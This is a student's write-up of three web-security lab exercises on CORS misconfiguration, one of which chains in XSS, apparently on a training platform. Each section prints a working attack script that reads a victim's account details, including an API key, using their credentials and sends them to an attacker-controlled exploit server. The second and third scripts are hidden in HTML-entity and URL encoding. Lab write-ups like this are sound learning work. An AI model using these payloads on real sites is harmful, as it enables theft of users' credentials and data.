## First Lab
I did everything as I was supposed to do, yet I could not get the API of admin. Nevertheless, I will attach the things I have done and I honestly don't know why exploit server did not return admin api. 

The script that I used:
>      <script>
        var req = new XMLHttpRequest();
        req.open("get","0a5800e0044edab38085d064001d00b8.web-security-academy.net/accountDetails",true);
        
        req.onload = () => {
            window.location.href = "/malicious?key=" + req.responseText;
        }
        
        req.withCredentials = true;
        req.send();
    </script>
![](lab1rep.png)
![](basicOrigin.png)
## Second Lab
Second lab was almost the same as the first one, fortunately I got it working. The only difference was using an <iframe> tag and using the sandbox property to contain our malicious code in it, also we had to encode our script first, in order to avoid quotation collisions in a code. As a result, we got our api of admin, which we submitted in the home page of lab source page.
Source code: 
>                <iframe 
                    sandbox="allow-forms allow-scripts allow-top-navigation"      srcdoc="&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x76;&#x61;&#x72;&#x20;&#x72;&#x65;&#x71;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x58;&#x4d;&#x4c;&#x48;&#x74;&#x74;&#x70;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x71;&#x2e;&#x6f;&#x70;&#x65;&#x6e;&#x28;&#x22;&#x67;&#x65;&#x74;&#x22;&#x2c;&#x22;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x30;&#x61;&#x62;&#x34;&#x30;&#x30;&#x39;&#x66;&#x30;&#x33;&#x65;&#x34;&#x33;&#x36;&#x61;&#x66;&#x38;&#x35;&#x64;&#x35;&#x32;&#x36;&#x34;&#x39;&#x30;&#x30;&#x37;&#x38;&#x30;&#x30;&#x62;&#x38;&#x2e;&#x77;&#x65;&#x62;&#x2d;&#x73;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x2d;&#x61;&#x63;&#x61;&#x64;&#x65;&#x6d;&#x79;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x61;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x44;&#x65;&#x74;&#x61;&#x69;&#x6c;&#x73;&#x22;&#x2c;&#x74;&#x72;&#x75;&#x65;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x71;&#x2e;&#x6f;&#x6e;&#x6c;&#x6f;&#x61;&#x64;&#x20;&#x3d;&#x20;&#x28;&#x29;&#x20;&#x3d;&#x3e;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;&#x2e;&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#x68;&#x72;&#x65;&#x66;&#x20;&#x3d;&#x20;&#x22;&#x2f;&#x6d;&#x61;&#x6c;&#x69;&#x63;&#x69;&#x6f;&#x75;&#x73;&#x3f;&#x6b;&#x65;&#x79;&#x3d;&#x22;&#x20;&#x2b;&#x20;&#x72;&#x65;&#x71;&#x2e;&#x72;&#x65;&#x73;&#x70;&#x6f;&#x6e;&#x73;&#x65;&#x54;&#x65;&#x78;&#x74;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x71;&#x2e;&#x77;&#x69;&#x74;&#x68;&#x43;&#x72;&#x65;&#x64;&#x65;&#x6e;&#x74;&#x69;&#x61;&#x6c;&#x73;&#x20;&#x3d;&#x20;&#x74;&#x72;&#x75;&#x65;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x71;&#x2e;&#x73;&#x65;&#x6e;&#x64;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;"
                    ></iframe>

![](lab2decoder.png)
![](lab2info.png)
![](lab2solved.png)

## Third Lab
We did find the Xss vulnerability through product id injection and found CORS vulnerability by trying to find the filtered origin source and we also have achieved that. However, when it came down to injecting the encoded code as we did in a second lab, we did not obtain any results and same as in a first lab work, I do not know why. 
Source code(we encoded the script code for cors vulnerability into xss code injection, cause it is url): 
>     <script>
        window.location = "http://stock.0ad700780427e2f6914a1ca600540017.web-security-academy.net/?productId=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%20%20%20%20%76%61%72%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%20%20%20%20%20%20%20%20%72%65%71%2e%6f%70%65%6e%28%22%67%65%74%22%2c%22%68%74%74%70%73%3a%2f%2f%30%61%64%37%30%30%37%38%30%34%32%37%65%32%66%36%39%31%34%61%31%63%61%36%30%30%35%34%30%30%31%37%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%22%2c%74%72%75%65%29%3b%0a%20%20%20%20%20%20%20%20%0a%20%20%20%20%20%20%20%20%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%28%29%20%3d%3e%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%77%69%6e%64%6f%77%2e%6c%6f%63%61%74%69%6f%6e%20%3d%20%22%20%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%64%30%30%30%65%64%30%34%65%36%65%32%66%63%39%31%64%38%31%62%34%36%30%31%30%38%30%30%35%36%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6b%65%79%3d%22%20%2b%20%72%65%71%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%0a%20%20%20%20%20%20%20%20%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%0a%20%20%20%20%20%20%20%20%72%65%71%2e%73%65%6e%64%28%29%3b%0a%20%20%20%20%3c%2f%73%63%72%69%70%74%3e&storeId=1"
    </script>
![](lab3cors.png)
![](lab3xss.png)
![](lab3not.png)
![](corsfinished.png)
